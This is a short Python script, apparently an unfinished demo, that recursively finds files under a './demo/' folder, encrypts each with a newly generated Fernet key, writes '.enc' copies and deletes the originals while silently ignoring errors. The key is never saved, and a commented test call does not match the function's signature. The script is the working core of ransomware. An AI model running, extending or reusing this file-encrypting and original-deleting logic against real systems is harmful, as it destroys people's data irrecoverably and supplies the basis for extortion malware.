import os
import glob
from cryptography.fernet import Fernet


ENCRYPT_GLOBS = [
    './demo/**/*.*'
]
KEY_FILE = 'secret.key'
ENCRYPTED_SUFFIX = '.enc'


def generate_key():
    '''Generate fernet synchronous key'''
    return Fernet.generate_key()


def seek_files(globs):
    '''Search for files in roots with recursive globs and return list of files without duplicates.'''
    files = set()
    for g in globs:
        files |= set( glob.glob(g, recursive=True) )
    return list(files)


def encrypt_files(files, key):
    '''Encrypt the given list of files with fernet and remove the originals'''
    fernet = Fernet(key)
    encrypted = []
    for file in files:
        output = f'{file}{ENCRYPTED_SUFFIX}'
        try:
            with open(file, "rb") as f:
                data = f.read()
            data = fernet.encrypt(data)
            with open(output, "wb") as f:
                f.write(data)
            os.remove(file)
            encrypted.append({
                'in': file,
                'out': output
            })
        except Exception:
            pass
    return encrypted


def main():
    # Encrypt
    key = generate_key()
    files = seek_files(ENCRYPT_GLOBS)
    encrypted = encrypt_files(files, key)

    # Write config


## Quick tests
# print(seek_files(ENCRYPT_GLOBS))
# generate_key('secret.key')

if __name__ == '__main__':
    main()
